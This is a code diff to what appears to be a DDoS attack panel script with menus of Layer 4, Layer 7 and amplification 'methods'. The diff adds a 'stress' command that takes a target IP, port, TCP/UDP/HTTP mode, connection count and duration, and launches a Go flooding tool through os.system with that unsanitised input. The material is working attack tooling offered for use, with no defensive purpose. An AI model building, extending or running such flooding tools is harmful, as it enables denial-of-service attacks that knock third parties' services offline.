@@ -354,6 +354,24 @@ def main():
                 print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                 print('Example: tcp GET 1.1.1.1 80 60 8500')
 
+# SPECIAL METHODS
+
+        elif "stress" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                mode = cnc.split()[3]
+                conn = cnc.split()[4]
+                time = cnc.split()[5]
+                out = cnc.split()[6]
+                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
+            except IndexError:
+                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
+                print('MODE: [1] TCP')
+                print('      [2] UDP')
+                print('      [3] HTTP')
+                print('Example: stress 1.1.1.1 80 3 1250 60 5')
+                
 # AMP/GAMES METHODS
 
         elif "samp" in cnc:
@@ -681,6 +699,7 @@ def main():
 LAYER7  ► SHOW LAYER7 METHODS
 LAYER4  ► SHOW LAYER4 METHODS
 AMP     ► SHOW AMP METHODS
+SPECIAL ► SHOW SPECIAL METHODS
 BANNERS ► SHOW BANNERS
 RULES   ► RULES PANEL
 PORTS   ► SHOW ALL PORTS
